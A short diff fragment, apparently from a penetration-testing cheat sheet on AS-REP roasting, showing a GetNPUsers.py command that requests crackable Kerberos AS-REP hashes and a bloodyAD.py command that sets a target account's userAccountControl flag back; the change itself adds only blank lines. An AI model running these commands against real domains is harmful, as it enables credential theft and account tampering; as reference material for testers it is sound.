@@ -21,3 +21,5 @@ $ GetNPUsers.py DOMAIN/target_user -format <AS_REP_responses_format [hashcat | j
 # Set back the userAccountControl
 $ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl [Target_User] 0x400000 False
 ```
+
+
